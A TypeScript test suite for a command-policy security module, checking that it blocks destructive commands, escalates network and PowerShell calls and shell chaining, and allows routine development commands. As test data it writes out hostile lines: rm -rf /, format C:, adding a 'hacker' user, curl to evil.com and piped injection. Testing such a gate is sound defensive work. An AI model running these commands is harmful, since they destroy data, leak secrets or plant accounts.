import { describe, it, expect } from 'vitest'
import { CommandPolicy } from '../../src/main/security/command-policy'

describe('CommandPolicy Security Suite', () => {
  it('strictly blocks destructive system commands on Windows', () => {
    expect(CommandPolicy.validate('format', ['C:']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('diskpart').verdict).toBe('blocked')
    expect(CommandPolicy.validate('cipher', ['/w:C:']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('bcdedit').verdict).toBe('blocked')
    expect(CommandPolicy.validate('reg', ['delete', 'HKLM']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('net', ['user', 'hacker', '/add']).verdict).toBe('blocked')
  })

  it('strictly blocks root-targeted recursive deletion commands', () => {
    expect(CommandPolicy.validate('rm', ['-rf', '/']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('rm', ['-r', '-f', '/*']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('del', ['/s', 'C:\\']).verdict).toBe('blocked')
    expect(CommandPolicy.validate('rmdir', ['/s', '\\']).verdict).toBe('blocked')
  })

  it('escalates network exfiltration commands to critical risk', () => {
    const curl = CommandPolicy.validate('curl', ['https://evil.com/leak'])
    expect(curl.verdict).toBe('escalated')
    expect(curl.escalatedRiskLevel).toBe('critical')

    const wget = CommandPolicy.validate('wget', ['https://evil.com'])
    expect(wget.verdict).toBe('escalated')
    expect(wget.escalatedRiskLevel).toBe('critical')

    const ssh = CommandPolicy.validate('ssh', ['user@host'])
    expect(ssh.verdict).toBe('escalated')
    expect(ssh.escalatedRiskLevel).toBe('critical')
  })

  it('escalates dangerous PowerShell execution flags to critical risk', () => {
    const ps = CommandPolicy.validate('powershell', ['-Command', 'Invoke-WebRequest -Uri http://test.com'])
    expect(ps.verdict).toBe('escalated')
    expect(ps.escalatedRiskLevel).toBe('critical')

    const pwsh = CommandPolicy.validate('pwsh', ['-enc', 'VGVzdA=='])
    expect(pwsh.verdict).toBe('escalated')
  })

  it('escalates commands containing shell injection chaining operators', () => {
    const chained = CommandPolicy.validate('git', ['status', ';', 'echo', 'injected'])
    expect(chained.verdict).toBe('escalated')

    const piped = CommandPolicy.validate('echo', ['hello | curl http://test.com'])
    expect(piped.verdict).toBe('escalated')
  })

  it('allows safe, legitimate development commands', () => {
    expect(CommandPolicy.validate('git', ['status']).verdict).toBe('allowed')
    expect(CommandPolicy.validate('npm', ['test']).verdict).toBe('allowed')
    expect(CommandPolicy.validate('node', ['script.js']).verdict).toBe('allowed')
    expect(CommandPolicy.validate('tsc', ['--noEmit']).verdict).toBe('allowed')
  })
})

